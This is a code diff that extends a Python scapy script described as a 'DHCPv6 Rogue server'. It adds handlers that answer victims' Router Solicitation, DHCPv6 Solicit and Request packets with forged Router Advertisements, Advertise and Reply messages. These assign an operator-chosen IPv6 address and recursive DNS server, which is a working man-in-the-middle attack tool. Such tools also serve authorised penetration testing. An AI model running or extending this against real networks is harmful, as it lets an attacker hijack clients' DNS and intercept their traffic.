@@ -6,6 +6,7 @@ from sys import exit
 from argparse import ArgumentParser
 from ipaddress import IPv6Address
 from scapy.all import sniff, Ether, IPv6, ICMPv6ND_RS, DHCP6_Solicit, DHCP6_Request, DHCP6_Release, DHCP6_Confirm
+from scapy.all import DHCP6OptClientId
 from socket import socket, AF_PACKET, SOCK_RAW, inet_aton
 from base64 import b64encode
 from struct import pack
@@ -29,7 +30,7 @@ parser = ArgumentParser(description='DHCPv6 Rogue server')
 parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
 parser.add_argument('-p', '--prefix', type=str, help='Set network prefix', default='fd00::/64')
 parser.add_argument('-f', '--first_suffix_ip', type=str, help='Set first suffix client ip for offering', default='2')
-parser.add_argument('-l', '--last_suffix_ip', type=str, help='Set last suffix client ip for offering', default='ff')
+parser.add_argument('-l', '--last_suffix_ip', type=str, help='Set last suffix client ip for offering', default='255')
 parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
 parser.add_argument('-I', '--target_ip', type=str, help='Set client IPv6 address with MAC in --target_mac', default=None)
 parser.add_argument('-d', '--dns', type=str, help='Set recursive DNS IPv6 address', default=None)
@@ -94,6 +95,11 @@ def reply(request):
     SOCK = socket(AF_PACKET, SOCK_RAW)
     SOCK.bind((current_network_interface, 0))
 
+    if target_ip_address is not None:
+        ipv6_address = target_ip_address
+    else:
+        ipv6_address = "fd00::32e"
+
     # ICMPv6 Router Solicitation
     if request.haslayer(ICMPv6ND_RS):
         print Base.c_info + "Sniff ICMPv6 Router Solicitation request from: " + request[IPv6].src + " (" + \
@@ -103,11 +109,12 @@ def reply(request):
                                                                    ipv6_src=your_ipv6_link_address,
                                                                    ipv6_dst=request[IPv6].src,
                                                                    prefix=network_prefix,
-                                                                   dns=recursive_dns_address,
-                                                                   domain_search=dns_search)
+                                                                   dns_address=recursive_dns_address,
+                                                                   domain_search=dns_search,
+                                                                   ipv6_addr=ipv6_address)
         try:
             SOCK.send(icmpv6_ra_packet)
-            print Base.c_warning + "Send ICMPv6 Router Advertisement reply to: " + request[IPv6].src + " (" + \
+            print Base.c_success + "Send ICMPv6 Router Advertisement reply to: " + request[IPv6].src + " (" + \
                   request[Ether].src + ")"
         except:
             print Base.c_error + "Do not send ICMPv6 Router Advertisement reply to: " + request[IPv6].src + " (" + \
@@ -116,22 +123,53 @@ def reply(request):
     # DHCPv6 Solicit
     if request.haslayer(DHCP6_Solicit):
         print Base.c_info + "Sniff DHCPv6 Solicit from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ")"
+              request[Ether].src + ") TID: " + hex(request[DHCP6_Solicit].trid)
+        dhcpv6_advertise = dhcpv6.make_advertise_packet(ethernet_src_mac=your_mac_address,
+                                                        ethernet_dst_mac=request[Ether].src,
+                                                        ipv6_src=your_ipv6_link_address,
+                                                        ipv6_dst=request[IPv6].src,
+                                                        transaction_id=request[DHCP6_Solicit].trid,
+                                                        dns_address=recursive_dns_address,
+                                                        domain_search=dns_search,
+                                                        ipv6_address=ipv6_address,
+                                                        client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
+        try:
+            SOCK.send(dhcpv6_advertise)
+            print Base.c_success + "Send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
+                  request[Ether].src + ")"
+        except:
+            print Base.c_error + "Do not send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
+                  request[Ether].src + ")"
 
     # DHCPv6 Request
     if request.haslayer(DHCP6_Request):
         print Base.c_info + "Sniff DHCPv6 Request from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ")"
+              request[Ether].src + ") TID: " + hex(request[DHCP6_Request].trid)
+        dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
+                                                ethernet_dst_mac=request[Ether].src,
+                                                ipv6_src=your_ipv6_link_address,
+                                                ipv6_dst=request[IPv6].src,
+                                                transaction_id=request[DHCP6_Request].trid,
+                                                dns_address=recursive_dns_address,
+                                                domain_search=dns_search,
+                                                ipv6_address=ipv6_address,
+                                                client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
+        try:
+            SOCK.send(dhcpv6_reply)
+            print Base.c_success + "Send DHCPv6 Reply to: " + request[IPv6].src + " (" + request[Ether].src + ")"
+        except:
+            print Base.c_error + "Do not send DHCPv6 Reply to: " + request[IPv6].src + " (" + \
+                  request[Ether].src + ")"
 
     # DHCPv6 Release
     if request.haslayer(DHCP6_Release):
         print Base.c_info + "Sniff DHCPv6 Release from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ")"
+              request[Ether].src + ")TID: " + hex(request[DHCP6_Release].trid)
 
     # DHCPv6 Confirm
     if request.haslayer(DHCP6_Confirm):
         print Base.c_info + "Sniff DHCPv6 Confirm from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ")"
+              request[Ether].src + ") TID: " + hex(request[DHCP6_Confirm].trid)
 
     SOCK.close()
 
